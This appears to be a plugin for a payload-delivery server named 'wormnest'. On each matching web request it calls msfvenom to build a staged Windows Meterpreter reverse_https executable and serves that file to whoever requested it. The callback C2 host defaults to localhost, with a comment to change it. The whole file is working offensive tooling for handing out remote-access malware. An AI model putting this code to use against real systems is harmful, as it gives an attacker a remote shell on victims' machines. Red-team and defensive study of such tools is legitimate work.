import hooker
from wormnest.utils import check_filename_for_hook
import os, sys
import tempfile

MSFVENOM = "msfvenom"	# msfvenom path
C2_HOST = "127.0.0.1"	# Returns to localhost: Change this!
C2_PORT = 443

# Staged MetHTTPS
PAYLOAD = "windows/meterpreter/reverse_https"	


@hooker.hook("on_request")
def autogen_msf(filename, request, retvals = {}):
	func_name = sys._getframe().f_code.co_name
	if not check_filename_for_hook(filename, func_name):
		return None

	extension = '.' + filename.split('.')[-1]
	fd = tempfile.NamedTemporaryFile('rb', suffix=extension)
	generated_file = fd.name

	command = "{msfv} -p {pl} LHOST={lh} LPORT={lp} -f exe -o {gen}".format(
			msfv = MSFVENOM,
			pl = PAYLOAD,
			lh = C2_HOST,
			lp = C2_PORT,
			gen = generated_file
		)
	print("[!] '{}'".format(command))
	os.system(command)

	retvals['fd'] = fd

	return fd